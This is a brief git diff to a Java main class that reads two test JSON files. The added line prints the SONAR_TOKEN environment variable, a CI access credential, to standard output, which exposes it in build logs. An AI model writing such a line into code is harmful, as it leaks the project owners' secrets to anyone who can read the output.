@@ -52,6 +52,8 @@ public class App {
 //        int exitCode = new CommandLine(new MyApp()).execute(args);
 //        System.exit(exitCode);
 //----------------------------------
+        System.out.println(System.getenv("SONAR_TOKEN"));
+//----------------------------------
         String puth1 = "src/test/resources/file1.json";
         String puth2 = "src/test/resources/file2.json";
         var file1 = ReadFile.parser(puth1);
